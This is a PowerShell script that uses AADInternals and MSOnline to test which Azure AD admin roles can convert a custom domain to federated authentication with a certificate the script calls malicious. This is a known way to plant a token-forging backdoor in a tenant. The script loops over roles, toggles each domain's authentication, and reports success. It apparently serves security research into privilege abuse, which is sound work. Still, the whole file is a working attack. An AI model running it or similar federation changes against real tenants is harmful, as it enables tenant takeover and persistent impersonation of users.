Import-Module AADInternals
Import-Module MSOnline

. .\config.ps1

if ($PSVersionTable.PSVersion.Major -ge 7) {
    Write-Error "MSOL isn't compatible with PowerShell 7+. Try again with PowerShell 5"
    return
}

$roles = @("globalAdmin", "securityAdmin", "hybridIdentityAdmin", "externalIdentityProviderAdmin", "domainNameAdmin", "partnerTier1Support", "partnerTier2Support")
# $roles = @("hybridIdentityAdmin")

foreach ($role in $roles) {
    Write-Host "---------------------- $role"
    $fqdn = "$role.$custom_domain_suffix"

    # first, use Global Admin account to disable federation
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials["globalAdmin"].login, (ConvertTo-SecureString -String $credentials["globalAdmin"].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    $atg = Get-AADIntAccessTokenForMSGraph -Credentials $Credential
    Connect-MsolService -AdGraphAccessToken $at -MsGraphAccessToken $atg

    Set-MsolDomainAuthentication -DomainName $fqdn -Authentication Managed

    # now, log as target user and try enabling federation

    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials[$role].login, (ConvertTo-SecureString -String $credentials[$role].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    $atg = Get-AADIntAccessTokenForMSGraph -Credentials $Credential
    Connect-MsolService -AdGraphAccessToken $at -MsGraphAccessToken $atg
    
    try {
        Set-MsolDomainAuthentication -DomainName $fqdn `
            -Authentication Federated `
            -SigningCertificate $malicious_cert `
            -IssuerUri "https://$fqdn/$('{0:X}' -f (Get-Date).GetHashCode())" `
            -LogOffUri "https://example.com/logoff" `
            -PassiveLogOnUri "https://example.com/logon" `
            -ErrorAction Stop
        Write-Host "[+] It worked :)"
    }
    catch {
        Write-Host "[-] Failed :( $($_.Exception.Message)"
    }
}